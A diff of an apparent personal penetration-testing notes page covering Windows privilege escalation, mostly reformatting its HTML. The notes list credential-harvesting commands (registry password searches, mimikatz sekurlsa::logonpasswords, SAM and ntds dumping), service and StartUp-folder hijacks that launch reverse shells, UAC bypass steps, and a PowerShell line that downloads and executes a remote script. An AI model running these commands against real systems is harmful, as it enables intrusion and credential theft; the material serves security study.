@@ -27,10 +27,12 @@ layout: default
             <li>Get info about a specific user</li>
         </ul>
     </ul>
+    
     <li>Kernel exploit</li>
     <ul>
         <li>Google the last installed "hotfix + exploit"</li>
     </ul>
+    
     <li>Check folders</li>
     <ul>
         <li>Look for interesting files</li>
@@ -38,16 +40,19 @@ layout: default
         <li>C:\Program Files\</li>
         <li>C:\Program Files (x86)\</li>
     </ul>
+    
     <li>Autologon creds</li>
     <ul>
         <li>get-item -path "HKLM:\software\microsoft\windows nt\currentversion\winlogon"</li>
         <li>reg.exe query "HKLM\software\microsoft\windows nt\currentversion\winlogon"</li>
     </ul>
+    
     <li>Check running processes, pay attention to admin</li>
     <ul>
         <li>tasklist /V</li>
         <li>Most application exploits are the same as other misconfigurations (weak folder configurations, unquoted service paths, etc)</li>
     </ul>
+    
     <li>Open ports</li>
     <ul>
         <li>netstat -an</li>
@@ -56,6 +61,7 @@ layout: default
             <li>Ones not listed during nmap scan/firewalled</li>
         </ul>
     </ul>
+    
     <li>Look for Group Policy (GPP) passwords</li>
     <ul>
         <li>Installed programs/applications</li>
@@ -66,6 +72,7 @@ layout: default
             </ul>
         </ul>
     </ul>
+    
     <li>Insecure Services</li>
     <ul>
         <li>AllAccess, Start</li>
@@ -73,10 +80,12 @@ layout: default
             <li>Change binpath</li>
         </ul>
     </ul>
+    
     <li>Startup Apps/autorun</li>
     <ul>
         <li>Important if we can reboot the box</li>
     </ul>
+    
     <li>Privilege Abuse</li>
     <ul>
         <li>SeLoadDriverPrivilege</li>
@@ -95,7 +104,9 @@ layout: default
         <li>SeDebugPrivilege</li>
         <li>Article on exploiting privileges:https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/</li>
     </ul>
+    
     <li>Always Install Elevated</li>
+    
     <li>Abuse GUI Program running as admin</li>
     <ul>
         <li>Inside application open file: file://c:/windows/system32/cmd.exe</li>
@@ -103,32 +114,36 @@ layout: default
             <li>Might get admin command prompt</li>
         </ul>
     </ul>
+    
     <li>Look for exploits for 3rd party drivers</li>
     <ul>
         <li>Enumerate drivers</li>
         <ul>
             <li>driverquery /v</li>
-            <li>Powershell - driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object‘Display Name’, ‘Start Mode’, Path</li>
+            <li>Powershell - driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object&OpenCurlyQuote;Display Name&rsquor;, &OpenCurlyQuote;Start Mode&rsquor;, Path</li>
         </ul>
         <li>Enumerate Driver Versions</li>
         <ul>
-            <li>Powershell - Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName,DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}</li>
+            <li>Powershell - Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName,DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like &quot;*VMware*&quot;}</li>
         </ul>
     </ul>
-    <li>Search the registry for keys and values that contain "password":</li>
+    
+    <li>Search the registry for keys and values that contain &quot;password&quot;:</li>
     <ul>
         <li>reg query HKLM /f password /t REG_SZ /s</li>
         <li>reg query HKCU /f password /t REG_SZ /s</li>
-        <li>reg query "HKLM\software\microsoft\windows nt\currentversion\winlogon"</li>
-        <li>reg query "HKCU\software\simontatham\putty\sessions" /s</li>
+        <li>reg query &quot;HKLM\software\microsoft\windows nt\currentversion\winlogon&quot;</li>
+        <li>reg query &quot;HKCU\software\simontatham\putty\sessions&quot; /s</li>
         <li>reg query HKLM\System\ControlSet001\Control\CurrentPass</li>
         <li>reg query HKLM\System\ControlSet002\Control\CurrentPass</li>
         <li>HKLM\System\CurrentControlSet\Control\CurrentPass</li>
     </ul>
+    
     <li>Scheduled Tasks</li>
     <ul>
         <li>schtasks /query /fo LIST /v</li>
     </ul>
+    
     <li>mysql</li>
     <ul>
         <li>run commands as mysql user</li>
@@ -137,6 +152,7 @@ layout: default
         </ul>
         <li>Search for creds</li>
     </ul>
+    
     <li>Login or run commands as other user using credentials or hashes</li>
     <ul>
         <li>Powershell</li>
@@ -145,6 +161,7 @@ layout: default
         <li>wmiexec</li>
         <li>pth-winexe</li>
     </ul>
+    
     <li>Check password attack vectors</li>
     <ul>
         <li>ASREPRoast</li>
@@ -175,6 +192,7 @@ layout: default
         <ul>
             <li>Repo does not include the bloodhound executable, this must be downloaded separately from releases</li>
         </ul>
+        
         <li>Usage instructions:</li>
         <ul>
             <li>Start neo4j on Kali</li>
@@ -206,9 +224,11 @@ layout: default
                 <li>Shortest path from Owned principles</li>
                 <li>Shortest path to High Value Targets</li>
             </ul>
+            
             <li>Can right click on account associations and select "Help" and it will give info how an AD association can be abused</li>
         </ul>
     </ul>
+    
     <li>SharpCollection</li>
     <ul>
         <li>Common C# offensive tools that are checked for updates daily, and then compiled</li>
@@ -226,6 +246,7 @@ layout: default
             <td>&lt;command&gt; | findstr</td>
         </tr>
     </table>
+    
     <li>System Information & Control</li>
     <table>
         <tr>
@@ -234,7 +255,12 @@ layout: default
         </tr>
         <tr>
             <td>Restart</td>
-            <td>shutdown -r -t 10 && exit<br><li>&& exit because an error message can pop up when initiating a restart with a shell still active.</li></td>
+            <td>
+                <li>shutdown -r -t 10 && exit</li>
+                <ul>
+                    <li>&& exit because an error message can pop up when initiating a restart with a shell still active.</li>
+                </ul>
+            </td>
         </tr>
         <tr>
             <td>List system-wide updates</td>
@@ -257,6 +283,7 @@ layout: default
             <td>net statistics</td>
         </tr>
     </table>
+    
     <li>Applications & Services</li>
     <table>
         <tr>
@@ -268,11 +295,15 @@ layout: default
             <td>tasklist /SVC</td>
         </tr>
     </table>
+    
     <li>User & Group Permissions</li>
     <table>
         <tr>
             <td>view current user</td>
-            <td>whoami<br>echo %username%</td>
+            <td>
+                <li>whoami</li>
+                <li>echo %username%</li>
+            </td>
         </tr>
         <tr>
             <td>See all user accounts</td>
@@ -335,6 +366,7 @@ layout: default
             <td>cacls &lt;file&gt; /r /e &lt;user&gt;</td>
         </tr>
     </table>
+    
     <li>File System</li>
     <table>
         <tr>
@@ -351,7 +383,11 @@ layout: default
                     </tr>
                     <tr>
                         <td>/r</td>
-                        <td>Display alternate data streams of the file (files that are acting like folders and contain files inside of them)<br><li>If data stream files are found, display content with Powershell: (Get-Content < main file> -Stream &lt;File inside the file&gt;</li>
+                        <td>
+                            <li>Display alternate data streams of the file (files that are acting like folders and contain files inside of them)</li>
+                            <ul>
+                                <li>If data stream files are found, display content with Powershell: (Get-Content &lt;main file&gt; -Stream &lt;File inside the file&gt;</li>
+                            </ul>
                         </td>
                     </tr>
                 </table>
@@ -378,6 +414,7 @@ layout: default
             <td>cacls &lt;file&gt;</td>
         </tr>
     </table>
+    
     <li>Networking</li>
     <table>
         <tr>
@@ -418,11 +455,11 @@ layout: default
     <table>
         <tr>
             <td>Enumerate drivers</td>
-            <td>Powershell - driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object‘Display Name’, ‘Start Mode’, Path</td>
+            <td>Powershell - driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object&OpenCurlyQuote;Display Name&rsquor;, &OpenCurlyQuote;Start Mode&rsquor;, Path</td>
         </tr>
         <tr>
             <td>Enumerate driver versions</td>
-            <td>Powershell - Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName,DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}</td>
+            <td>Powershell - Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName,DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like &quot;*VMware*&quot;}</td>
         </tr>
         <tr>
             <td>Check operating system architecture</td>
@@ -454,7 +491,7 @@ layout: default
             <td>C:\Users\&lt;user&gt;\appdata\roaming\microsoft\windows\powershell\psreadline\ConsoleHost_history.txt</td>
         </tr>
     </table>
-    <!--<li>Applications & Services</li>-->
+    
     <li>User & Group Permissions</li>
     <table>
         <tr>
@@ -471,9 +508,13 @@ layout: default
         </tr>
         <tr>
             <td>View service permissions</td>
-            <td>$acl = get-acl HKLM:\System\CurrentControlSet\Services<br>ConvertFrom-SddlString -Sddl $acl.Sddl -type RegistryRights | ForEach-Object {$_.DiscretionaryAcl}</td>
+            <td>
+                <li>$acl = get-acl HKLM:\System\CurrentControlSet\Services</li>
+                <li>ConvertFrom-SddlString -Sddl $acl.Sddl -type RegistryRights | ForEach-Object {$_.DiscretionaryAcl}</li>
+            </td>
         </tr>
     </table>
+    
     <li>File System</li>
     <table>
         <tr>
@@ -505,7 +546,7 @@ layout: default
             <td>-ErrorAction SilentlyContinue<br>ErrorAction ignore</td>
         </tr>
     </table>
-    <!--<li>Networking</li>-->
+    
     <li>Miscellaneous</li>
     <table>
         <tr>
@@ -518,7 +559,10 @@ layout: default
         </tr>
         <tr>
             <td>dot-source / load all variables & functions from powershell script</td>
-            <td>.\&lt;script&gt;.ps1<br>iex (New-Object System.Net.Webclient).DownloadString(&#039;https://website.com/url/to/file.ps1&#039;)</td>
+            <td>
+                <li>.\&lt;script&gt;.ps1</li>
+                <li>iex (New-Object System.Net.Webclient).DownloadString(&#039;https://website.com/url/to/file.ps1&#039;)</li>
+            </td>
         </tr>
     </table>
     
@@ -530,7 +574,7 @@ layout: default
     <table>
         <tr>
             <td>Base64 Decoding</td>
-            <td><li>powershell -e &lt;base 64&gt;</li></td>
+            <td>powershell -e &lt;base 64&gt;</td>
         </tr>
         <tr>
             <td>Download file</td>
@@ -600,6 +644,7 @@ layout: default
                         <td>Simple type: &lt;Drive Name Assigned to SMB Share&gt;:</td>
                     </tr>
                 </table>
+                
                 <li>Mount SMB share using cmd and simple credentials</li>
                 <table>
                     <tr>
@@ -615,21 +660,35 @@ layout: default
                         <td>cd \\&lt;ip address&gt;\&lt;share name&gt;\</td>
                     </tr>
                 </table>
+                
                 <li>Create SMB share using Linux's built-in SMB server</li>
                 <table>
                     <tr>
                         <td>Create SMB Share (optional and self-explanatory parameters included)</td>
-                        <td>sudo vi /etc/samba/smb.conf<br>[share]<br>comment = My Share<br>browseable = yes<br>path = /srv/SMB<br>read only = no<br>guest ok = yes<br>writable = yes<br>create mask = 0777</td>
+                        <td>
+                            <li>sudo vi /etc/samba/smb.conf</li>
+                            <li>[share]</li>
+                            <li>comment = My Share</li>
+                            <li>browseable = yes</li>path = /srv/SMB
+                            <li>read only = no</li>
+                            <li>guest ok = yes</li>
+                            <li>writable = yes</li>
+                            <li>create mask = 0777</li>
+                        </td>
                     </tr>
                     <tr>
                         <td>Might need to give SMB permissions to share directory</td>
-                        <td>chmod 777 &lt;smb share directory&gt;<br>chmod 755 &lt;smb share directory&gt;</td>
+                        <td>
+                            <li>chmod 777 &lt;smb share directory&gt;</li>
+                            <li>chmod 755 &lt;smb share directory&gt;</li>
+                        </td>
                     </tr>
                     <tr>
                         <td>Start Share</td>
                         <td>service smbd restart</td>
                     </tr>
                 </table>
+                
                 <li>Troubleshoot by using smbclient and access the SMB directory on our machine and attempt to retrieve or upload files.</li>
             </td>
         </tr>
@@ -723,15 +782,18 @@ layout: default
             <li>Directory</li>
             <li>if we have access, we can add a reverseShell.exe, and when admin logs in we will get a admin priv reverse shell.</li>
         </ul>
+        
         <li>Check access to directory with accesschk.exe:</li>
         <ul>
             <li>accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"</li>
         </ul>
+        
         <li>files in StartUp directory must be shortcuts (.lnk)</li>
         <ul>
             <li>VBScript to create a shortcut file:</li>
             <pre>&#13;&#10;Set oWS = WScript.CreateObject(&quot;WScript.Shell&quot;)&#13;&#10;sLinkFile = &quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk&quot;&#13;&#10;Set oLink = oWS.CreateShortcut(sLinkFile)&#13;&#10;oLink.TargetPath = &quot;C:\PrivEsc\reverse.exe&quot;&#13;&#10;oLink.Save&#13;&#10;            </pre>
         </ul>
+        
         <li>cmd "cscript CreateShortCut.vbs"</li>
     </ul>
     
@@ -745,6 +807,7 @@ layout: default
         <li>Works up until sometime in 2019. </li>
         <li>Patched on latest Windows 10.</li>
     </ul>
+    
     <li>Juicy Potato</li>
     <ul>
         <li>JuicyPotato.exe -l 1337 -p &lt;program&gt; -t * -c &lt;{CLSID}&gt;</li>
@@ -759,6 +822,7 @@ layout: default
             <li>On victim Windows machine: RoguePotato.exe -r 10.0.0.5 -l 9999 -e "C:\windows\system32\cmd.exe"</li>
         </ul>
     </ul>
+    
     <li>PrintSpoofer</li>
     <ul>
         <li>Targets print spooler service</li>
@@ -767,10 +831,12 @@ layout: default
         <li>Requires C++ redistributable is installed.</li>
         <li>PrintSpoofer.exe -i -c "C:\reverse\shell.exe"</li>
     </ul>
+    
     <li>SeAssignPrimaryTokenPrivilege</li>
     <ul>
         <li>Potato Exploits (SeImpersonatePrivilege)</li>
     </ul>
+    
     <li>SeLoadDriverPrivilege</li>
     <ul>
         <li>Download these files:</li>
@@ -780,8 +846,10 @@ layout: default
             <ul>
                 <li>eoploaddriver.cpp</li>
             </ul>
+            
             <li>Exploitcapcom from github</li>
         </ul>
+        
         <li>Compile EoPLoadDriver in visual studio</li>
         <ul>
             <li>Create a new project</li>
@@ -789,16 +857,19 @@ layout: default
                 <li>Console app</li>
                 <li>Name it LoadDriver</li>
             </ul>
+            
             <li>Open LoadDriver.cpp</li>
             <ul>
                 <li>Replace all contents with contents from eoploaddriver.cpp</li>
             </ul>
+            
             <li>Select "Release" and "x64"</li>
-            <li>Build --> Rebuild Solution.  LoadDriver.exe should be created.</li>
+            <li>Build --&gt; Rebuild Solution.  LoadDriver.exe should be created.</li>
         </ul>
+        
         <li>Compile ExploitCapCom</li>
         <ul>
-            <li>File --> Open -- Project/Solution</li>
+            <li>File --&gt; Open -- Project/Solution</li>
             <ul>
                 <li>Select Exploit Capcom</li>
                 <li>Set "Release" and "x64"</li>
@@ -806,6 +877,7 @@ layout: default
                 <li>ExploitCapCom.exe should be created</li>
             </ul>
         </ul>
+        
         <li>Transfer ExploitCapCom.exe, LoadDriver.exe, and capcom.sys to victim machine</li>
         <ul>
             <li>LoadDriver.exe System\CurrentControlSet\MyService C:\&lt;path to capcom.sys&gt;</li>
@@ -825,6 +897,7 @@ layout: default
                 <li>Crack them</li>
             </ul>
         </ul>
+        
         <li>Backup ntds file to SMB server</li>
         <table>
             <tr>
@@ -855,14 +928,7 @@ layout: default
                             <td>Edit SMB to setup SMB share</td>
                             <td>
                                 <li>sudo vi /etc/samba/smb.conf</li>
-                                <table>
-                                    [shared]
-                                    comment = &lt;anything&gt;
-                                    browseable = yes
-                                    path = &lt;local path to SMB share&gt;
-                                    read only = no
-                                    guest = yes
-                                </table>
+                                <pre>&#13;&#10;[shared]&#13;&#10;comment = &lt;anything&gt;&#13;&#10;browseable = yes&#13;&#10;path = &lt;local path to SMB share&gt;&#13;&#10;read only = no&#13;&#10;guest = yes&#13;&#10;                                </pre>
                             </td>
                         </tr>
                         <tr>
@@ -887,6 +953,7 @@ layout: default
                             <li>Version identified:&lt;version&gt;</li>
                         </ul>
                     </ul>
+                    
                     <li>ntds.dit should be in C:\</li>
                 </td>
             </tr>
@@ -906,6 +973,7 @@ layout: default
         <li>Lets the owner take ownership over an object</li>
         <li>Same as SeRestorePrivilege after taking ownership of files</li>
     </ul>
+    
     <li>More reading on token abuse: https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt</li>
     
     <hr>
@@ -914,14 +982,17 @@ layout: default
     
     <li>Check if enabled</li>
     <ul>
+        
         <li>HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer</li>
         <ul>
             <li>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</li>
         </ul>
+        
         <li>HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer</li>
         <ul>
             <li>reg query HKLM\software\policies\microsoft\windows\installer /v alwaysinstallelevated</li>
         </ul>
+        
         <li>Create msi reverse shell and execute it</li>
     </ul>
     
@@ -946,8 +1017,9 @@ layout: default
     <li>Search for world writable files:</li>
     <ul>
         <li>Accesschk.exe -uws "Everyone" "C:\Program Files"</li>
-        <li>Powershell.exe "Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}"</li>
+        <li>Powershell.exe &quot;Get-ChildItem &quot;C:\Program Files&quot; -Recurse | Get-ACL | ?{$_.AccessToString -match &quot;Everyone\sAllow\s\sModify&quot;}&quot;</li>
     </ul>
+    
     <li>Configuration Files</li>
     <ul>
         <li>Look for files like Unattend.xml which might contain credentials</li>
@@ -956,6 +1028,7 @@ layout: default
             <li>dir /s *pass* == *.config</li>
         </ul>
     </ul>
+    
     <li>Recursively search for files in the current directory that contain the word “password” and also end in either .xml, .ini, or .txt:</li>
     <ul>
         <li>findstr /si password *.xml *.ini *.txt</li>
@@ -994,7 +1067,7 @@ layout: default
                     </tr>
                     <tr>
                         <td>Show all services owened by SYSTEM and start type is manual</td>
-                        <td>$services | where { ($_.ObjectName -match 'LocalSystem') -and ($_.Start -match '3') }</td>
+                        <td>$services | where { ($_.ObjectName -match &apos;LocalSystem&apos;) -and ($_.Start -match &apos;3&apos;) }</td>
                     </tr>
                     <tr>
                         <td>Get list of services with only name, no details</td>
@@ -1002,7 +1075,7 @@ layout: default
                     </tr>
                     <tr>
                         <td>List all services owened by SYSTEM, start type manual, and we have permission to start</td>
-                        <td>$canStart = Foreach ($service in $names) { $sddl = (cmd /c sc sdshow $service); if ($sddl -match "RP[A-Z]*?;;;AU") { $service }}</td>
+                        <td>$canStart = Foreach ($service in $names) { $sddl = (cmd /c sc sdshow $service); if ($sddl -match &quot;RP[A-Z]*?;;;AU&quot;) { $service }}</td>
                     </tr>
                 </table>
             </td>
@@ -1016,6 +1089,7 @@ layout: default
             </td>
         </tr>
     </table>
+    
     <li>Tools</li>
     <ul>
         <li>winPEAS</li>
@@ -1025,6 +1099,7 @@ layout: default
                 <td>winPEASany.exe quiet servicesinfo</td>
             </tr>
         </table>
+        
         <li>sc.exe</li>
         <table>
             <tr>
@@ -1052,6 +1127,7 @@ layout: default
                 <td>sc config &lt;name&gt; binpath= "\"C:\path\to\reverse_shell\""</td>
             </tr>
         </table>
+        
         <li>accesschk.exe</li>
         <table>
             <tr>
@@ -1075,6 +1151,7 @@ layout: default
                 <td>accesschk.exe /accepteula -quvw &lt;Executable&gt;</td>
             </tr>
         </table>
+        
         <li>net</li>
         <table>
             <tr>
@@ -1082,6 +1159,7 @@ layout: default
                 <td>net start/stop &lt;name&gt;</td>
             </tr>
         </table>
+        
         <li>wmic</li>
         <table>
             <tr>
@@ -1097,17 +1175,19 @@ layout: default
                 <td>wmic service get name,displayname,pathname,startmode |findstr /i "auto"|findstr /i /v "c:\windows"</td>
             </tr>
         </table>
+        
         <li>powershell</li>
         <table>
             <tr>
                 <td>List running services</td>
-                <td>Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}</td>
+                <td>Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like &apos;Running&apos;}</td>
             </tr>
             <tr>
                 <td>Start service</td>
                 <td>Start-Service &lt;service&gt;</td>
             </tr>
         </table>
+        
         <li>cmd</li>
         <table>
             <tr>
@@ -1115,6 +1195,7 @@ layout: default
                 <td>tasklist</td>
             </tr>
         </table>
+        
         <li>icacls</li>
         <table>
             <tr>
@@ -1127,6 +1208,7 @@ layout: default
             </tr>
         </table>
     </ul>
+    
     <li>Insecure Service Properties</li>
     <ul>
         <li>Change binary path</li>
@@ -1135,6 +1217,7 @@ layout: default
             <li>sc.exe config usosvc binpath="cmd.exe /c powershell.exe -EncodedCommand &lt;base64&gt;</li>
         </ul>
     </ul>
+    
     <li>Unquoted Service Path</li>
     <ul>
         <li>Try to raplce a path location to a reverse shell executable</li>
@@ -1151,10 +1234,12 @@ layout: default
             </ul>
         </ul>
     </ul>
+    
     <li>Weak Registry Permissions</li>
     <ul>
         <li>INTERACTIVE group includes all users that can login locally</li>
     </ul>
+    
     <table>
         <tr>
             <td>Check registry permissions using PowerShell</td>
@@ -1195,10 +1280,12 @@ layout: default
             </td>
         </tr>
     </table>
+    
     <li>Insecure Service Executables</li>
     <ul>
         <li>If able, replace original service executable with our own.</li>
     </ul>
+    
     <table>
         <tr>
             <td>Check for access with accesschk.exe</td>
@@ -1209,6 +1296,7 @@ layout: default
             <td>Icacls "C:\&lt;executable&gt;"</td>
         </tr>
     </table>
+    
     <li>DLL Hijacking</li>
     <ul>
         <li>Enumerate non-windows services to see which one we are able to start/stop</li>
@@ -1217,8 +1305,8 @@ layout: default
             <li>Download executable</li>
             <li>Open procmon</li>
             <li>Stop and clear capture</li>
-            <li>Push ctrl + L - drop down menu for "Process Name" - enter process name - push add & OK</li>
-            <li>Deselect "show registry activity" & "show network activity"</li>
+            <li>Push ctrl + L - drop down menu for &quot;Process Name&quot; - enter process name - push add &amp; OK</li>
+            <li>Deselect &quot;show registry activity&quot; &amp; &quot;show network activity&quot;</li>
             <li>Start capture</li>
             <li>Look for dll's that are attempted to be executed but do not exist.  Put a reverse shell .dll in that directory</li>
         </ul>
@@ -1234,448 +1322,467 @@ layout: default
     <ul>
         <li>Administrator can set tasks to run as other users.</li>
     </ul>
+    
     <li>List all scheduled tasks your user can see:</li>
     <ul>
         <li>Schtasks /query /fo LIST /v</li>
-        <li>Get-ScheduledTask| where {$_.TaskPath-notlike"\Microsoft*"} | ft TaskName,TaskPath,State</li>
+        <li>Get-ScheduledTask| where {$_.TaskPath-notlike&quot;\Microsoft*&quot;} | ft TaskName,TaskPath,State</li>
     </ul>
+    
     <li>Usually need to look for tasks based on other clues like finding a script or log file that shows a scheduled task is being run.</li>
     <li>look for a script running on a schedule and modify it with some malicious action.  Look into interesting directories.</li>
-</ul>
-
-<hr>
-
-<h2>Bypass UAC</h2>
-<li>UAC Bypass requires administrator account</li>
-<li>Check if UAC is on</li>
-<ul>
-    <li>reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System</li>
+    
+    <hr>
+    
+    <h2>Bypass UAC</h2>
+    
+    <li>UAC Bypass requires administrator account</li>
+    <li>Check if UAC is on</li>
     <ul>
-        <li>EnableLUA</li>
+        <li>reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System</li>
         <ul>
-            <li>0 = UAC enabled, no bypass needed, can PsExec to SYSTEM</li>
-            <li>1 = UAC disabled, need to check the other 2 keys</li>
-        </ul>
-        <li>ConsentPromptBehaviorAdmin</li>
-        <ul>
-            <li>Can take on 6 different values</li>
-        </ul>
-        <li>PromptOnSecureDesktop</li>
-        <ul>
-            <li>Either 1 or 0</li>
-        </ul>
-        <li>If ConsentPromptBehaviorAdmin=2 & PromptOnSecureDesktop=1 then UAC bypass will not work</li>
-        <li>If ConsentPromptBehaviorAdmin=5 & PromptOnSecureDesktop=1 then UAC bypass will work</li>
-    </ul>
-</ul>
-
-<li>ConsentPromptBehaviorAdmin Values:</li>
-<table>
-    <tr>
-        <td>Value</td>
-        <td>Meaning</td>
-    </tr>
-    <tr>
-        <td>0x00000000</td>
-        <td>This option allows the Consent Admin to perform an operation that requires elevation without consent or credentials.</td>
-    </tr>
-    <tr>
-        <td>0x00000001</td>
-        <td>This option prompts the Consent Admin to enter his or her user name and password (or another valid admin) when an operation requires elevation of privilege. This operation occurs on the secure desktop.</td>
-    </tr>
-    <tr>
-        <td>0x00000002</td>
-        <td>This option prompts the administrator in Admin Approval Mode to select either "Permit" or "Deny" an operation that requires elevation of privilege. If the Consent Admin selects Permit, the operation will continue with the highest available privilege. "Prompt for consent" removes the inconvenience of requiring that users enter their name and password to perform a privileged task. This operation occurs on the secure desktop.</td>
-    </tr>
-    <tr>
-        <td>0x00000003</td>
-        <td>This option prompts the Consent Admin to enter his or her user name and password (or that of another valid admin) when an operation requires elevation of privilege.</td>
-    </tr>
-    <tr>
-        <td>0x00000004</td>
-        <td>This prompts the administrator in Admin Approval Mode to select either "Permit" or "Deny" an operation that requires elevation of privilege. If the Consent Admin selects Permit, the operation will continue with the highest available privilege. "Prompt for consent" removes the inconvenience of requiring that users enter their name and password to perform a privileged task.</td>
-    </tr>
-    <tr>
-        <td>0x00000005</td>
-        <td>This option is the default. It is used to prompt the administrator in Admin Approval Mode to select either "Permit" or "Deny" for an operation that requires elevation of privilege for any non-Windows binaries. If the Consent Admin selects Permit, the operation will continue with the highest available privilege. This operation will happen on the secure desktop.</td>
-    </tr>
-</table>
-
-<li>Eventvwr.exe UAC bypass:</li>
-<ul>
-    <li>Works on Windows 7, 8, and 10.  Does not work on Vista</li>
-    <li>Guide: https://ivanitlearning.wordpress.com/2019/07/07/bypassing-default-uac-settings-manually/</li>
-    <li>Exploit in C (requires minimal editing) - https://github.com/turbo/zero2hero</li>
-</ul>
-
-<li>Pre-made UAC bypass executables on Kali</li>
-<ul>
-    <li>bypassuac-x86.exe & bypassuac-x64.exe</li>
-    <li>Same limitations as eventvwr.exe UAC bypass</li>
-    <li>bypassuac-x**.exe /c C:\directory\to\shell4444.exe</li>
-</ul>
-
-<hr>
-
-<h2>Finding Logged in Users</h2>
-
-<li>Enumerate Logged on Users</li>
-<ul>
-    <li>Individual Workstation</li>
-    <ul>
-        <li>NetWkstaUserEnum</li>
-        <ul>
-            <li>Requires admin privileges</li>
-        </ul>
-        <li>Powerview.ps1</li>
-        <ul>
-            <li>Get-NetLoggedon –ComputerName &lt;workstation name&gt;</li>
-        </ul>
-    </ul>
-    <li>Domain Enumeration</li>
-    <ul>
-        <li>NetSessionEnum</li>
-        <ul>
-            <li>Enumerate active sessions on domain joined machines</li>
-            <li>Does not require admin privileges</li>
-            <li>Use against file servers and domain controllers</li>
-            <li>Powerview.ps1</li>
+            <li>EnableLUA</li>
             <ul>
-                <li>Get-NetSession</li>
-                <ul>
-                    <li>Get-NetSession –ComputerName &lt;domain controller or server &ndash; ex. dc01&gt;</li>
-                </ul>
+                <li>0 = UAC enabled, no bypass needed, can PsExec to SYSTEM</li>
+                <li>1 = UAC disabled, need to check the other 2 keys</li>
             </ul>
-        </ul>
-    </ul>
-</ul>
-
-<hr>
-
-<h2>Security Identifier (SID)</h2>
-
-<li>Every account has one.</li>
-<ul>
-    <li>There is a separate one for each account that is used for elevated privileges (UAC)</li>
-</ul>
-<li>Windows refers to accounts by SIDs, people refer to accounts by account names</li>
-<li>All SIDs start with S-1-5-21</li>
-<ul>
-    <li>Admin always ends in 500</li>
-    <li>Guest always ends in 501</li>
-    <li>S-1-5-19 is the LocalSystem account</li>
-</ul>
-
-<li>Example SID: S-1-5-21-1180699209-877415012-3182924384-1004</li>
-<table>
-    <tr>
-        <td>S</td>
-        <td>1</td>
-        <td>5</td>
-        <td>21-1180699209-877415012-3182924384</td>
-        <td>1004</td>
-    </tr>
-    <tr>
-        <td>Indicates this is a SID</td>
-        <td>SID specification version number</td>
-        <td>Identifier authority</td>
-        <td>Domain or local computer identifier</td>
-        <td>Relative ID</td>
-    </tr>
-</table>
-
-<hr>
-
-<h2>Dump Hashes</h2>
-
-<li>Dumped hash format</li>
-<ul>
-    <li>Username:#:LM HASH:NTLM HASH:::</li>
-</ul>
-
-<li>SAM, SYSTEM, and SECURITY Location</li>
-<ul>
-    <li>C:\Windows\System32\config\</li>
-    <li>Backup Locations</li>
-    <ul>
-        <li>C:\Windows\System32\config\RegBack</li>
-        <li>C:\Windows\Repair</li>
-    </ul>
-    <li>reg save HKLM\&lt;file&gt; &lt;Out file&gt;</li>
-</ul>
-
-<li>mimikatz</li>
-<ul>
-    <li>Extracts hashes from the Local Security Authority Subsystem (LSASS)</li>
-    <li>Dump creds/hashes</li>
-    <ul>
-        <li>Summary</li>
-        <ul>
-            <li>privilege::debug</li>
-            <li>token::elevate</li>
-            <li>lsadump::sam</li>
-            <li>sekurlsa::logonpasswords</li>
-        </ul>
-        <li>Explained/Detailed</li>
-        <ul>
-            <li>Mimikatz must be launched from an administrative command prompts</li>
+            
+            <li>ConsentPromptBehaviorAdmin</li>
             <ul>
-                <li>Must first execute two commands:</li>
-                <ul>
-                    <li>privilege::debug – enables SeDebugPrivilege</li>
-                    <ul>
-                        <li>If fails, mimikatz was most likely not executed with admin privileges</li>
-                    </ul>
-                    <li>token::elevate</li>
-                    <ul>
-                        <li>Elevates mimikatz security token from administrator to SYSTEM</li>
-                        <li>If mimikatz is launched from a SYSTEM shell, this step can be skipped</li>
-                    </ul>
-                </ul>
-                <li>Dump SAM contents (Security Account Manager)</li>
-                <ul>
-                    <li>lsadump::sam</li>
-                </ul>
-                <li>Dump NTLM hash</li>
-                <ul>
-                    <li>sekurlsa::logonpasswords</li>
-                    <ul>
-                        <li>This will dump the credentials of all users currently logged into the workstation or server.</li>
-                        <ul>
-                            <li>Includes remote logins like RDP sessions</li>
-                        </ul>
-                        <li>If WDigest is enabled Mimikatz will reveal cleartext passwords alongside hashes (Windows 7)</li>
-                    </ul>
-                </ul>
+                <li>Can take on 6 different values</li>
             </ul>
-        </ul>
-    </ul>
-    <li>ERROR kuhl_m_sekurlsa_acquireLSA; Key import</li>
-    <ul>
-        <li>Newer Windows update makes it so mimikatz versions 2.2.0 and newer do not work.  Must use an older version of mimikatz.</li>
-        <ul>
-            <li>https://gitlab.com/kalilinux/packages/mimikatz/-/tree/d72fc2cca1df23f60f81bc141095f65a131fd099/</li>
-        </ul>
-    </ul>
-</ul>
-
-<li>Other tools such as samdump2, pwdump, fgdump, and Windows Credential Editor (wce) work well against older Windows OS's such as XP or Server 2003</li>
-
-<li>impacket-secretsdump</li>
-<ul>
-    <li>Dump hashes locally</li>
-    <ul>
-        <li>impacket-secretsdump -sam &lt;SAM file&gt; -security &lt;SECURITY file&gt; [-system &lt;SYSTEM file&gt;] LOCAL</li>
